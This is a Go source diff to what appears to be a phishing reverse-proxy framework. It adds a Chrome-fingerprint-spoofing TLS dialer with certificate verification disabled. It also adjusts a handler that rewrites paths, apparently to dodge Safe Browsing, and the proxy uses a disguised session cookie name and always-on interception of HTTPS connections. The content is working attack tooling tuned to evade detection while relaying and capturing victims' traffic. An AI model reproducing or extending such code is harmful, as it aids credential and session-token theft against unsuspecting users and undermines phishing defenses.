@@ -124,7 +124,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
-	_ = utls.HelloChrome_Auto
+		p.Proxy.Tr = &http.Transport{
+			DialTLS: func(network, addr string) (net.Conn, error) {
+				host, _, err := net.SplitHostPort(addr)
+				if err != nil {
+					host = addr
+				}
+				conn, err := net.Dial(network, addr)
+				if err != nil {
+					return nil, err
+				}
+				uConn := utls.UClient(conn, &utls.Config{ServerName: host, InsecureSkipVerify: true}, utls.HelloChrome_Auto)
+				if err := uConn.Handshake(); err != nil {
+					conn.Close()
+					return nil, err
+				}
+				return uConn, nil
+		},
+	}
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
 		Handler:      p.Proxy,
@@ -149,13 +166,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-        p.rewriteSafeBrowsingPath(req)
-
-        	req.URL.Scheme = "https"
+        	p.rewriteSafeBrowsingPath(req)
+	        req.URL.Scheme = "https"
         	req.URL.Host = req.Host
         	p.Proxy.ServeHTTP(w, req)
 	})
-
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 
 	p.Proxy.OnRequest().
@@ -1991,7 +2006,6 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return "__Secure-GTSID"
 }
-
 func (p *HttpProxy) rewriteSafeBrowsingPath(req *http.Request) {
     currentPath := req.URL.Path
     if strings.HasPrefix(currentPath, "/secure-gateway/") {
